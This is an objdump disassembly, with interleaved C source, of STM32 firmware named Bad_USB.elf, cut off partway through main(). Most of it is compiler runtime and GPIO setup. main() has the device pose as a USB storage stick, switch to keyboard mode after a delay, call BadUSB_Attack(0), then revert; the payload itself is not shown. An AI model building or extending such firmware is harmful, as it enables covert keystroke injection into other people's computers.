
Bad_USB.elf:     file format elf32-littlearm

Sections:
Idx Name          Size      VMA       LMA       File off  Algn
  0 .isr_vector   0000018c  08000000  08000000  00010000  2**0
                  CONTENTS, ALLOC, LOAD, READONLY, DATA
  1 .text         0000d098  0800018c  0800018c  0001018c  2**2
                  CONTENTS, ALLOC, LOAD, READONLY, CODE
  2 .rodata       00000234  0800d224  0800d224  0001d224  2**2
                  CONTENTS, ALLOC, LOAD, READONLY, DATA
  3 .ARM.extab    00000000  0800d458  0800d458  00020240  2**0
                  CONTENTS
  4 .ARM          00000008  0800d458  0800d458  0001d458  2**2
                  CONTENTS, ALLOC, LOAD, READONLY, DATA
  5 .preinit_array 00000000  0800d460  0800d460  00020240  2**0
                  CONTENTS, ALLOC, LOAD, DATA
  6 .init_array   00000004  0800d460  0800d460  0001d460  2**2
                  CONTENTS, ALLOC, LOAD, DATA
  7 .fini_array   00000004  0800d464  0800d464  0001d464  2**2
                  CONTENTS, ALLOC, LOAD, DATA
  8 .data         00000240  20000000  0800d468  00020000  2**2
                  CONTENTS, ALLOC, LOAD, DATA
  9 .bss          00001cd4  20000240  0800d6a8  00020240  2**2
                  ALLOC
 10 ._user_heap_stack 00001604  20001f14  0800d6a8  00021f14  2**0
                  ALLOC
 11 .ARM.attributes 00000030  00000000  00000000  00020240  2**0
                  CONTENTS, READONLY
 12 .comment      00000043  00000000  00000000  00020270  2**0
                  CONTENTS, READONLY
 13 .debug_info   00020aaf  00000000  00000000  000202b3  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 14 .debug_abbrev 0000538c  00000000  00000000  00040d62  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 15 .debug_aranges 00001b38  00000000  00000000  000460f0  2**3
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 16 .debug_rnglists 000014c7  00000000  00000000  00047c28  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 17 .debug_macro  00026624  00000000  00000000  000490ef  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 18 .debug_line   00025b56  00000000  00000000  0006f713  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 19 .debug_str    000d24ba  00000000  00000000  00095269  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 20 .debug_frame  00006f70  00000000  00000000  00167724  2**2
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 21 .debug_line_str 00000049  00000000  00000000  0016e694  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS

Disassembly of section .text:

0800018c <__do_global_dtors_aux>:
 800018c:	b510      	push	{r4, lr}
 800018e:	4c05      	ldr	r4, [pc, #20]	; (80001a4 <__do_global_dtors_aux+0x18>)
 8000190:	7823      	ldrb	r3, [r4, #0]
 8000192:	b933      	cbnz	r3, 80001a2 <__do_global_dtors_aux+0x16>
 8000194:	4b04      	ldr	r3, [pc, #16]	; (80001a8 <__do_global_dtors_aux+0x1c>)
 8000196:	b113      	cbz	r3, 800019e <__do_global_dtors_aux+0x12>
 8000198:	4804      	ldr	r0, [pc, #16]	; (80001ac <__do_global_dtors_aux+0x20>)
 800019a:	f3af 8000 	nop.w
 800019e:	2301      	movs	r3, #1
 80001a0:	7023      	strb	r3, [r4, #0]
 80001a2:	bd10      	pop	{r4, pc}
 80001a4:	20000240 	.word	0x20000240
 80001a8:	00000000 	.word	0x00000000
 80001ac:	0800d20c 	.word	0x0800d20c

080001b0 <frame_dummy>:
 80001b0:	b508      	push	{r3, lr}
 80001b2:	4b03      	ldr	r3, [pc, #12]	; (80001c0 <frame_dummy+0x10>)
 80001b4:	b11b      	cbz	r3, 80001be <frame_dummy+0xe>
 80001b6:	4903      	ldr	r1, [pc, #12]	; (80001c4 <frame_dummy+0x14>)
 80001b8:	4803      	ldr	r0, [pc, #12]	; (80001c8 <frame_dummy+0x18>)
 80001ba:	f3af 8000 	nop.w
 80001be:	bd08      	pop	{r3, pc}
 80001c0:	00000000 	.word	0x00000000
 80001c4:	20000244 	.word	0x20000244
 80001c8:	0800d20c 	.word	0x0800d20c

080001cc <strlen>:
 80001cc:	4603      	mov	r3, r0
 80001ce:	f813 2b01 	ldrb.w	r2, [r3], #1
 80001d2:	2a00      	cmp	r2, #0
 80001d4:	d1fb      	bne.n	80001ce <strlen+0x2>
 80001d6:	1a18      	subs	r0, r3, r0
 80001d8:	3801      	subs	r0, #1
 80001da:	4770      	bx	lr

080001dc <__aeabi_uldivmod>:
 80001dc:	b953      	cbnz	r3, 80001f4 <__aeabi_uldivmod+0x18>
 80001de:	b94a      	cbnz	r2, 80001f4 <__aeabi_uldivmod+0x18>
 80001e0:	2900      	cmp	r1, #0
 80001e2:	bf08      	it	eq
 80001e4:	2800      	cmpeq	r0, #0
 80001e6:	bf1c      	itt	ne
 80001e8:	f04f 31ff 	movne.w	r1, #4294967295
 80001ec:	f04f 30ff 	movne.w	r0, #4294967295
 80001f0:	f000 b970 	b.w	80004d4 <__aeabi_idiv0>
 80001f4:	f1ad 0c08 	sub.w	ip, sp, #8
 80001f8:	e96d ce04 	strd	ip, lr, [sp, #-16]!
 80001fc:	f000 f806 	bl	800020c <__udivmoddi4>
 8000200:	f8dd e004 	ldr.w	lr, [sp, #4]
 8000204:	e9dd 2302 	ldrd	r2, r3, [sp, #8]
 8000208:	b004      	add	sp, #16
 800020a:	4770      	bx	lr

0800020c <__udivmoddi4>:
 800020c:	e92d 47f0 	stmdb	sp!, {r4, r5, r6, r7, r8, r9, sl, lr}
 8000210:	9e08      	ldr	r6, [sp, #32]
 8000212:	460d      	mov	r5, r1
 8000214:	4604      	mov	r4, r0
 8000216:	460f      	mov	r7, r1
 8000218:	2b00      	cmp	r3, #0
 800021a:	d14a      	bne.n	80002b2 <__udivmoddi4+0xa6>
 800021c:	428a      	cmp	r2, r1
 800021e:	4694      	mov	ip, r2
 8000220:	d965      	bls.n	80002ee <__udivmoddi4+0xe2>
 8000222:	fab2 f382 	clz	r3, r2
 8000226:	b143      	cbz	r3, 800023a <__udivmoddi4+0x2e>
 8000228:	fa02 fc03 	lsl.w	ip, r2, r3
 800022c:	f1c3 0220 	rsb	r2, r3, #32
 8000230:	409f      	lsls	r7, r3
 8000232:	fa20 f202 	lsr.w	r2, r0, r2
 8000236:	4317      	orrs	r7, r2
 8000238:	409c      	lsls	r4, r3
 800023a:	ea4f 4e1c 	mov.w	lr, ip, lsr #16
 800023e:	fa1f f58c 	uxth.w	r5, ip
 8000242:	fbb7 f1fe 	udiv	r1, r7, lr
 8000246:	0c22      	lsrs	r2, r4, #16
 8000248:	fb0e 7711 	mls	r7, lr, r1, r7
 800024c:	ea42 4207 	orr.w	r2, r2, r7, lsl #16
 8000250:	fb01 f005 	mul.w	r0, r1, r5
 8000254:	4290      	cmp	r0, r2
 8000256:	d90a      	bls.n	800026e <__udivmoddi4+0x62>
 8000258:	eb1c 0202 	adds.w	r2, ip, r2
 800025c:	f101 37ff 	add.w	r7, r1, #4294967295
 8000260:	f080 811c 	bcs.w	800049c <__udivmoddi4+0x290>
 8000264:	4290      	cmp	r0, r2
 8000266:	f240 8119 	bls.w	800049c <__udivmoddi4+0x290>
 800026a:	3902      	subs	r1, #2
 800026c:	4462      	add	r2, ip
 800026e:	1a12      	subs	r2, r2, r0
 8000270:	b2a4      	uxth	r4, r4
 8000272:	fbb2 f0fe 	udiv	r0, r2, lr
 8000276:	fb0e 2210 	mls	r2, lr, r0, r2
 800027a:	ea44 4402 	orr.w	r4, r4, r2, lsl #16
 800027e:	fb00 f505 	mul.w	r5, r0, r5
 8000282:	42a5      	cmp	r5, r4
 8000284:	d90a      	bls.n	800029c <__udivmoddi4+0x90>
 8000286:	eb1c 0404 	adds.w	r4, ip, r4
 800028a:	f100 32ff 	add.w	r2, r0, #4294967295
 800028e:	f080 8107 	bcs.w	80004a0 <__udivmoddi4+0x294>
 8000292:	42a5      	cmp	r5, r4
 8000294:	f240 8104 	bls.w	80004a0 <__udivmoddi4+0x294>
 8000298:	4464      	add	r4, ip
 800029a:	3802      	subs	r0, #2
 800029c:	ea40 4001 	orr.w	r0, r0, r1, lsl #16
 80002a0:	1b64      	subs	r4, r4, r5
 80002a2:	2100      	movs	r1, #0
 80002a4:	b11e      	cbz	r6, 80002ae <__udivmoddi4+0xa2>
 80002a6:	40dc      	lsrs	r4, r3
 80002a8:	2300      	movs	r3, #0
 80002aa:	e9c6 4300 	strd	r4, r3, [r6]
 80002ae:	e8bd 87f0 	ldmia.w	sp!, {r4, r5, r6, r7, r8, r9, sl, pc}
 80002b2:	428b      	cmp	r3, r1
 80002b4:	d908      	bls.n	80002c8 <__udivmoddi4+0xbc>
 80002b6:	2e00      	cmp	r6, #0
 80002b8:	f000 80ed 	beq.w	8000496 <__udivmoddi4+0x28a>
 80002bc:	2100      	movs	r1, #0
 80002be:	e9c6 0500 	strd	r0, r5, [r6]
 80002c2:	4608      	mov	r0, r1
 80002c4:	e8bd 87f0 	ldmia.w	sp!, {r4, r5, r6, r7, r8, r9, sl, pc}
 80002c8:	fab3 f183 	clz	r1, r3
 80002cc:	2900      	cmp	r1, #0
 80002ce:	d149      	bne.n	8000364 <__udivmoddi4+0x158>
 80002d0:	42ab      	cmp	r3, r5
 80002d2:	d302      	bcc.n	80002da <__udivmoddi4+0xce>
 80002d4:	4282      	cmp	r2, r0
 80002d6:	f200 80f8 	bhi.w	80004ca <__udivmoddi4+0x2be>
 80002da:	1a84      	subs	r4, r0, r2
 80002dc:	eb65 0203 	sbc.w	r2, r5, r3
 80002e0:	2001      	movs	r0, #1
 80002e2:	4617      	mov	r7, r2
 80002e4:	2e00      	cmp	r6, #0
 80002e6:	d0e2      	beq.n	80002ae <__udivmoddi4+0xa2>
 80002e8:	e9c6 4700 	strd	r4, r7, [r6]
 80002ec:	e7df      	b.n	80002ae <__udivmoddi4+0xa2>
 80002ee:	b902      	cbnz	r2, 80002f2 <__udivmoddi4+0xe6>
 80002f0:	deff      	udf	#255	; 0xff
 80002f2:	fab2 f382 	clz	r3, r2
 80002f6:	2b00      	cmp	r3, #0
 80002f8:	f040 8090 	bne.w	800041c <__udivmoddi4+0x210>
 80002fc:	1a8a      	subs	r2, r1, r2
 80002fe:	ea4f 471c 	mov.w	r7, ip, lsr #16
 8000302:	fa1f fe8c 	uxth.w	lr, ip
 8000306:	2101      	movs	r1, #1
 8000308:	fbb2 f5f7 	udiv	r5, r2, r7
 800030c:	fb07 2015 	mls	r0, r7, r5, r2
 8000310:	0c22      	lsrs	r2, r4, #16
 8000312:	ea42 4200 	orr.w	r2, r2, r0, lsl #16
 8000316:	fb0e f005 	mul.w	r0, lr, r5
 800031a:	4290      	cmp	r0, r2
 800031c:	d908      	bls.n	8000330 <__udivmoddi4+0x124>
 800031e:	eb1c 0202 	adds.w	r2, ip, r2
 8000322:	f105 38ff 	add.w	r8, r5, #4294967295
 8000326:	d202      	bcs.n	800032e <__udivmoddi4+0x122>
 8000328:	4290      	cmp	r0, r2
 800032a:	f200 80cb 	bhi.w	80004c4 <__udivmoddi4+0x2b8>
 800032e:	4645      	mov	r5, r8
 8000330:	1a12      	subs	r2, r2, r0
 8000332:	b2a4      	uxth	r4, r4
 8000334:	fbb2 f0f7 	udiv	r0, r2, r7
 8000338:	fb07 2210 	mls	r2, r7, r0, r2
 800033c:	ea44 4402 	orr.w	r4, r4, r2, lsl #16
 8000340:	fb0e fe00 	mul.w	lr, lr, r0
 8000344:	45a6      	cmp	lr, r4
 8000346:	d908      	bls.n	800035a <__udivmoddi4+0x14e>
 8000348:	eb1c 0404 	adds.w	r4, ip, r4
 800034c:	f100 32ff 	add.w	r2, r0, #4294967295
 8000350:	d202      	bcs.n	8000358 <__udivmoddi4+0x14c>
 8000352:	45a6      	cmp	lr, r4
 8000354:	f200 80bb 	bhi.w	80004ce <__udivmoddi4+0x2c2>
 8000358:	4610      	mov	r0, r2
 800035a:	eba4 040e 	sub.w	r4, r4, lr
 800035e:	ea40 4005 	orr.w	r0, r0, r5, lsl #16
 8000362:	e79f      	b.n	80002a4 <__udivmoddi4+0x98>
 8000364:	f1c1 0720 	rsb	r7, r1, #32
 8000368:	408b      	lsls	r3, r1
 800036a:	fa22 fc07 	lsr.w	ip, r2, r7
 800036e:	ea4c 0c03 	orr.w	ip, ip, r3
 8000372:	fa05 f401 	lsl.w	r4, r5, r1
 8000376:	fa20 f307 	lsr.w	r3, r0, r7
 800037a:	40fd      	lsrs	r5, r7
 800037c:	ea4f 491c 	mov.w	r9, ip, lsr #16
 8000380:	4323      	orrs	r3, r4
 8000382:	fbb5 f8f9 	udiv	r8, r5, r9
 8000386:	fa1f fe8c 	uxth.w	lr, ip
 800038a:	fb09 5518 	mls	r5, r9, r8, r5
 800038e:	0c1c      	lsrs	r4, r3, #16
 8000390:	ea44 4405 	orr.w	r4, r4, r5, lsl #16
 8000394:	fb08 f50e 	mul.w	r5, r8, lr
 8000398:	42a5      	cmp	r5, r4
 800039a:	fa02 f201 	lsl.w	r2, r2, r1
 800039e:	fa00 f001 	lsl.w	r0, r0, r1
 80003a2:	d90b      	bls.n	80003bc <__udivmoddi4+0x1b0>
 80003a4:	eb1c 0404 	adds.w	r4, ip, r4
 80003a8:	f108 3aff 	add.w	sl, r8, #4294967295
 80003ac:	f080 8088 	bcs.w	80004c0 <__udivmoddi4+0x2b4>
 80003b0:	42a5      	cmp	r5, r4
 80003b2:	f240 8085 	bls.w	80004c0 <__udivmoddi4+0x2b4>
 80003b6:	f1a8 0802 	sub.w	r8, r8, #2
 80003ba:	4464      	add	r4, ip
 80003bc:	1b64      	subs	r4, r4, r5
 80003be:	b29d      	uxth	r5, r3
 80003c0:	fbb4 f3f9 	udiv	r3, r4, r9
 80003c4:	fb09 4413 	mls	r4, r9, r3, r4
 80003c8:	ea45 4404 	orr.w	r4, r5, r4, lsl #16
 80003cc:	fb03 fe0e 	mul.w	lr, r3, lr
 80003d0:	45a6      	cmp	lr, r4
 80003d2:	d908      	bls.n	80003e6 <__udivmoddi4+0x1da>
 80003d4:	eb1c 0404 	adds.w	r4, ip, r4
 80003d8:	f103 35ff 	add.w	r5, r3, #4294967295
 80003dc:	d26c      	bcs.n	80004b8 <__udivmoddi4+0x2ac>
 80003de:	45a6      	cmp	lr, r4
 80003e0:	d96a      	bls.n	80004b8 <__udivmoddi4+0x2ac>
 80003e2:	3b02      	subs	r3, #2
 80003e4:	4464      	add	r4, ip
 80003e6:	ea43 4308 	orr.w	r3, r3, r8, lsl #16
 80003ea:	fba3 9502 	umull	r9, r5, r3, r2
 80003ee:	eba4 040e 	sub.w	r4, r4, lr
 80003f2:	42ac      	cmp	r4, r5
 80003f4:	46c8      	mov	r8, r9
 80003f6:	46ae      	mov	lr, r5
 80003f8:	d356      	bcc.n	80004a8 <__udivmoddi4+0x29c>
 80003fa:	d053      	beq.n	80004a4 <__udivmoddi4+0x298>
 80003fc:	b156      	cbz	r6, 8000414 <__udivmoddi4+0x208>
 80003fe:	ebb0 0208 	subs.w	r2, r0, r8
 8000402:	eb64 040e 	sbc.w	r4, r4, lr
 8000406:	fa04 f707 	lsl.w	r7, r4, r7
 800040a:	40ca      	lsrs	r2, r1
 800040c:	40cc      	lsrs	r4, r1
 800040e:	4317      	orrs	r7, r2
 8000410:	e9c6 7400 	strd	r7, r4, [r6]
 8000414:	4618      	mov	r0, r3
 8000416:	2100      	movs	r1, #0
 8000418:	e8bd 87f0 	ldmia.w	sp!, {r4, r5, r6, r7, r8, r9, sl, pc}
 800041c:	f1c3 0120 	rsb	r1, r3, #32
 8000420:	fa02 fc03 	lsl.w	ip, r2, r3
 8000424:	fa20 f201 	lsr.w	r2, r0, r1
 8000428:	fa25 f101 	lsr.w	r1, r5, r1
 800042c:	409d      	lsls	r5, r3
 800042e:	432a      	orrs	r2, r5
 8000430:	ea4f 471c 	mov.w	r7, ip, lsr #16
 8000434:	fa1f fe8c 	uxth.w	lr, ip
 8000438:	fbb1 f0f7 	udiv	r0, r1, r7
 800043c:	fb07 1510 	mls	r5, r7, r0, r1
 8000440:	0c11      	lsrs	r1, r2, #16
 8000442:	ea41 4105 	orr.w	r1, r1, r5, lsl #16
 8000446:	fb00 f50e 	mul.w	r5, r0, lr
 800044a:	428d      	cmp	r5, r1
 800044c:	fa04 f403 	lsl.w	r4, r4, r3
 8000450:	d908      	bls.n	8000464 <__udivmoddi4+0x258>
 8000452:	eb1c 0101 	adds.w	r1, ip, r1
 8000456:	f100 38ff 	add.w	r8, r0, #4294967295
 800045a:	d22f      	bcs.n	80004bc <__udivmoddi4+0x2b0>
 800045c:	428d      	cmp	r5, r1
 800045e:	d92d      	bls.n	80004bc <__udivmoddi4+0x2b0>
 8000460:	3802      	subs	r0, #2
 8000462:	4461      	add	r1, ip
 8000464:	1b49      	subs	r1, r1, r5
 8000466:	b292      	uxth	r2, r2
 8000468:	fbb1 f5f7 	udiv	r5, r1, r7
 800046c:	fb07 1115 	mls	r1, r7, r5, r1
 8000470:	ea42 4201 	orr.w	r2, r2, r1, lsl #16
 8000474:	fb05 f10e 	mul.w	r1, r5, lr
 8000478:	4291      	cmp	r1, r2
 800047a:	d908      	bls.n	800048e <__udivmoddi4+0x282>
 800047c:	eb1c 0202 	adds.w	r2, ip, r2
 8000480:	f105 38ff 	add.w	r8, r5, #4294967295
 8000484:	d216      	bcs.n	80004b4 <__udivmoddi4+0x2a8>
 8000486:	4291      	cmp	r1, r2
 8000488:	d914      	bls.n	80004b4 <__udivmoddi4+0x2a8>
 800048a:	3d02      	subs	r5, #2
 800048c:	4462      	add	r2, ip
 800048e:	1a52      	subs	r2, r2, r1
 8000490:	ea45 4100 	orr.w	r1, r5, r0, lsl #16
 8000494:	e738      	b.n	8000308 <__udivmoddi4+0xfc>
 8000496:	4631      	mov	r1, r6
 8000498:	4630      	mov	r0, r6
 800049a:	e708      	b.n	80002ae <__udivmoddi4+0xa2>
 800049c:	4639      	mov	r1, r7
 800049e:	e6e6      	b.n	800026e <__udivmoddi4+0x62>
 80004a0:	4610      	mov	r0, r2
 80004a2:	e6fb      	b.n	800029c <__udivmoddi4+0x90>
 80004a4:	4548      	cmp	r0, r9
 80004a6:	d2a9      	bcs.n	80003fc <__udivmoddi4+0x1f0>
 80004a8:	ebb9 0802 	subs.w	r8, r9, r2
 80004ac:	eb65 0e0c 	sbc.w	lr, r5, ip
 80004b0:	3b01      	subs	r3, #1
 80004b2:	e7a3      	b.n	80003fc <__udivmoddi4+0x1f0>
 80004b4:	4645      	mov	r5, r8
 80004b6:	e7ea      	b.n	800048e <__udivmoddi4+0x282>
 80004b8:	462b      	mov	r3, r5
 80004ba:	e794      	b.n	80003e6 <__udivmoddi4+0x1da>
 80004bc:	4640      	mov	r0, r8
 80004be:	e7d1      	b.n	8000464 <__udivmoddi4+0x258>
 80004c0:	46d0      	mov	r8, sl
 80004c2:	e77b      	b.n	80003bc <__udivmoddi4+0x1b0>
 80004c4:	3d02      	subs	r5, #2
 80004c6:	4462      	add	r2, ip
 80004c8:	e732      	b.n	8000330 <__udivmoddi4+0x124>
 80004ca:	4608      	mov	r0, r1
 80004cc:	e70a      	b.n	80002e4 <__udivmoddi4+0xd8>
 80004ce:	4464      	add	r4, ip
 80004d0:	3802      	subs	r0, #2
 80004d2:	e742      	b.n	800035a <__udivmoddi4+0x14e>

080004d4 <__aeabi_idiv0>:
 80004d4:	4770      	bx	lr
 80004d6:	bf00      	nop

080004d8 <MX_GPIO_Init>:
        * Output
        * EVENT_OUT
        * EXTI
*/
void MX_GPIO_Init(void)
{
 80004d8:	b580      	push	{r7, lr}
 80004da:	b088      	sub	sp, #32
 80004dc:	af00      	add	r7, sp, #0

  GPIO_InitTypeDef GPIO_InitStruct = {0};
 80004de:	f107 030c 	add.w	r3, r7, #12
 80004e2:	2200      	movs	r2, #0
 80004e4:	601a      	str	r2, [r3, #0]
 80004e6:	605a      	str	r2, [r3, #4]
 80004e8:	609a      	str	r2, [r3, #8]
 80004ea:	60da      	str	r2, [r3, #12]
 80004ec:	611a      	str	r2, [r3, #16]

  /* GPIO Ports Clock Enable */
  __HAL_RCC_GPIOC_CLK_ENABLE();
 80004ee:	4b24      	ldr	r3, [pc, #144]	; (8000580 <MX_GPIO_Init+0xa8>)
 80004f0:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 80004f2:	4a23      	ldr	r2, [pc, #140]	; (8000580 <MX_GPIO_Init+0xa8>)
 80004f4:	f043 0304 	orr.w	r3, r3, #4
 80004f8:	64d3      	str	r3, [r2, #76]	; 0x4c
 80004fa:	4b21      	ldr	r3, [pc, #132]	; (8000580 <MX_GPIO_Init+0xa8>)
 80004fc:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 80004fe:	f003 0304 	and.w	r3, r3, #4
 8000502:	60bb      	str	r3, [r7, #8]
 8000504:	68bb      	ldr	r3, [r7, #8]
  __HAL_RCC_GPIOA_CLK_ENABLE();
 8000506:	4b1e      	ldr	r3, [pc, #120]	; (8000580 <MX_GPIO_Init+0xa8>)
 8000508:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 800050a:	4a1d      	ldr	r2, [pc, #116]	; (8000580 <MX_GPIO_Init+0xa8>)
 800050c:	f043 0301 	orr.w	r3, r3, #1
 8000510:	64d3      	str	r3, [r2, #76]	; 0x4c
 8000512:	4b1b      	ldr	r3, [pc, #108]	; (8000580 <MX_GPIO_Init+0xa8>)
 8000514:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 8000516:	f003 0301 	and.w	r3, r3, #1
 800051a:	607b      	str	r3, [r7, #4]
 800051c:	687b      	ldr	r3, [r7, #4]
  __HAL_RCC_GPIOB_CLK_ENABLE();
 800051e:	4b18      	ldr	r3, [pc, #96]	; (8000580 <MX_GPIO_Init+0xa8>)
 8000520:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 8000522:	4a17      	ldr	r2, [pc, #92]	; (8000580 <MX_GPIO_Init+0xa8>)
 8000524:	f043 0302 	orr.w	r3, r3, #2
 8000528:	64d3      	str	r3, [r2, #76]	; 0x4c
 800052a:	4b15      	ldr	r3, [pc, #84]	; (8000580 <MX_GPIO_Init+0xa8>)
 800052c:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 800052e:	f003 0302 	and.w	r3, r3, #2
 8000532:	603b      	str	r3, [r7, #0]
 8000534:	683b      	ldr	r3, [r7, #0]

  /*Configure GPIO pin Output Level */
  HAL_GPIO_WritePin(GPIOB, SPI1_CS_Pin|LD3_Pin, GPIO_PIN_SET);
 8000536:	2201      	movs	r2, #1
 8000538:	2109      	movs	r1, #9
 800053a:	4812      	ldr	r0, [pc, #72]	; (8000584 <MX_GPIO_Init+0xac>)
 800053c:	f001 fc3a 	bl	8001db4 <HAL_GPIO_WritePin>

  /*Configure GPIO pin : PtPin */
  GPIO_InitStruct.Pin = SPI1_CS_Pin;
 8000540:	2301      	movs	r3, #1
 8000542:	60fb      	str	r3, [r7, #12]
  GPIO_InitStruct.Mode = GPIO_MODE_OUTPUT_PP;
 8000544:	2301      	movs	r3, #1
 8000546:	613b      	str	r3, [r7, #16]
  GPIO_InitStruct.Pull = GPIO_PULLUP;
 8000548:	2301      	movs	r3, #1
 800054a:	617b      	str	r3, [r7, #20]
  GPIO_InitStruct.Speed = GPIO_SPEED_FREQ_LOW;
 800054c:	2300      	movs	r3, #0
 800054e:	61bb      	str	r3, [r7, #24]
  HAL_GPIO_Init(SPI1_CS_GPIO_Port, &GPIO_InitStruct);
 8000550:	f107 030c 	add.w	r3, r7, #12
 8000554:	4619      	mov	r1, r3
 8000556:	480b      	ldr	r0, [pc, #44]	; (8000584 <MX_GPIO_Init+0xac>)
 8000558:	f001 fac2 	bl	8001ae0 <HAL_GPIO_Init>

  /*Configure GPIO pin : PtPin */
  GPIO_InitStruct.Pin = LD3_Pin;
 800055c:	2308      	movs	r3, #8
 800055e:	60fb      	str	r3, [r7, #12]
  GPIO_InitStruct.Mode = GPIO_MODE_OUTPUT_PP;
 8000560:	2301      	movs	r3, #1
 8000562:	613b      	str	r3, [r7, #16]
  GPIO_InitStruct.Pull = GPIO_NOPULL;
 8000564:	2300      	movs	r3, #0
 8000566:	617b      	str	r3, [r7, #20]
  GPIO_InitStruct.Speed = GPIO_SPEED_FREQ_LOW;
 8000568:	2300      	movs	r3, #0
 800056a:	61bb      	str	r3, [r7, #24]
  HAL_GPIO_Init(LD3_GPIO_Port, &GPIO_InitStruct);
 800056c:	f107 030c 	add.w	r3, r7, #12
 8000570:	4619      	mov	r1, r3
 8000572:	4804      	ldr	r0, [pc, #16]	; (8000584 <MX_GPIO_Init+0xac>)
 8000574:	f001 fab4 	bl	8001ae0 <HAL_GPIO_Init>

}
 8000578:	bf00      	nop
 800057a:	3720      	adds	r7, #32
 800057c:	46bd      	mov	sp, r7
 800057e:	bd80      	pop	{r7, pc}
 8000580:	40021000 	.word	0x40021000
 8000584:	48000400 	.word	0x48000400

08000588 <main>:
/**
  * @brief  The application entry point.
  * @retval int
  */
int main(void)
{
 8000588:	b580      	push	{r7, lr}
 800058a:	b082      	sub	sp, #8
 800058c:	af00      	add	r7, sp, #0
  /* USER CODE END 1 */

  /* MCU Configuration--------------------------------------------------------*/

  /* Reset of all peripherals, Initializes the Flash interface and the Systick. */
  HAL_Init();
 800058e:	f000 fe84 	bl	800129a <HAL_Init>
  /* USER CODE BEGIN Init */

  /* USER CODE END Init */

  /* Configure the system clock */
  SystemClock_Config();
 8000592:	f000 f85f 	bl	8000654 <SystemClock_Config>
  /* USER CODE BEGIN SysInit */

  /* USER CODE END SysInit */

  /* Initialize all configured peripherals */
  MX_GPIO_Init();
 8000596:	f7ff ff9f 	bl	80004d8 <MX_GPIO_Init>
  MX_USART2_UART_Init();
 800059a:	f000 fdbb 	bl	8001114 <MX_USART2_UART_Init>
  MX_SPI1_Init();
 800059e:	f000 fc53 	bl	8000e48 <MX_SPI1_Init>
  /* USER CODE BEGIN 2 */
  int flag = 0;
 80005a2:	2300      	movs	r3, #0
 80005a4:	607b      	str	r3, [r7, #4]
  isMSC = 1;
 80005a6:	4b27      	ldr	r3, [pc, #156]	; (8000644 <main+0xbc>)
 80005a8:	2201      	movs	r2, #1
 80005aa:	601a      	str	r2, [r3, #0]
  uint32_t Flash_Busy;
  MX_USB_DEVICE_Init_MSC();
 80005ac:	f00b ffec 	bl	800c588 <MX_USB_DEVICE_Init_MSC>

  memset(sent_buffer, 0x00, sizeof(uint8_t)*USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
 80005b0:	220f      	movs	r2, #15
 80005b2:	2100      	movs	r1, #0
 80005b4:	4824      	ldr	r0, [pc, #144]	; (8000648 <main+0xc0>)
 80005b6:	f00c fdef 	bl	800d198 <memset>

  flag = 1;
 80005ba:	2301      	movs	r3, #1
 80005bc:	607b      	str	r3, [r7, #4]
  /* USER CODE END 2 */

  /* Infinite loop */
  /* USER CODE BEGIN WHILE */
  while(1){
	  InterruptTrap(&InterruptFlag);
 80005be:	4823      	ldr	r0, [pc, #140]	; (800064c <main+0xc4>)
 80005c0:	f000 fa70 	bl	8000aa4 <InterruptTrap>
	  Flash_Busy = __HAL_FLASH_GET_FLAG(FLASH_FLAG_BSY);
 80005c4:	4b22      	ldr	r3, [pc, #136]	; (8000650 <main+0xc8>)
 80005c6:	691b      	ldr	r3, [r3, #16]
 80005c8:	f403 3380 	and.w	r3, r3, #65536	; 0x10000
 80005cc:	2b00      	cmp	r3, #0
 80005ce:	bf14      	ite	ne
 80005d0:	2301      	movne	r3, #1
 80005d2:	2300      	moveq	r3, #0
 80005d4:	b2db      	uxtb	r3, r3
 80005d6:	603b      	str	r3, [r7, #0]
	  switch(flag){
 80005d8:	687b      	ldr	r3, [r7, #4]
 80005da:	2b01      	cmp	r3, #1
 80005dc:	d003      	beq.n	80005e6 <main+0x5e>
 80005de:	687b      	ldr	r3, [r7, #4]
 80005e0:	2b02      	cmp	r3, #2
 80005e2:	d01c      	beq.n	800061e <main+0x96>
		  }
		  flag = 0;
		  SwitchToMSC();
		  break;
	  default:
		  break;
 80005e4:	e02c      	b.n	8000640 <main+0xb8>
		  HAL_Delay(10000);
 80005e6:	f242 7010 	movw	r0, #10000	; 0x2710
 80005ea:	f000 fecb 	bl	8001384 <HAL_Delay>
			  if(!Flash_Busy){
 80005ee:	683b      	ldr	r3, [r7, #0]
 80005f0:	2b00      	cmp	r3, #0
 80005f2:	d1fc      	bne.n	80005ee <main+0x66>
				  SwitchToHID();
 80005f4:	f000 f8a6 	bl	8000744 <SwitchToHID>
				  while(!TestHID())
 80005f8:	e003      	b.n	8000602 <main+0x7a>
					  HAL_Delay(TestHIDSlot);
 80005fa:	f44f 707a 	mov.w	r0, #1000	; 0x3e8
 80005fe:	f000 fec1 	bl	8001384 <HAL_Delay>
				  while(!TestHID())
 8000602:	f000 fa6d 	bl	8000ae0 <TestHID>
 8000606:	4603      	mov	r3, r0
 8000608:	2b00      	cmp	r3, #0
 800060a:	d0f6      	beq.n	80005fa <main+0x72>
				  BadUSB_Attack(0);
 800060c:	2000      	movs	r0, #0
 800060e:	f000 fa8f 	bl	8000b30 <BadUSB_Attack>
				  break;
 8000612:	bf00      	nop
		  flag = 2;
 8000614:	2302      	movs	r3, #2
 8000616:	607b      	str	r3, [r7, #4]
		  SwitchToMSC();
 8000618:	f000 f8ac 	bl	8000774 <SwitchToMSC>
		  break;
 800061c:	e010      	b.n	8000640 <main+0xb8>
		  HAL_Delay(20000);
 800061e:	f644 6020 	movw	r0, #20000	; 0x4e20
 8000622:	f000 feaf 	bl	8001384 <HAL_Delay>
			  if(!Flash_Busy){
 8000626:	683b      	ldr	r3, [r7, #0]
 8000628:	2b00      	cmp	r3, #0
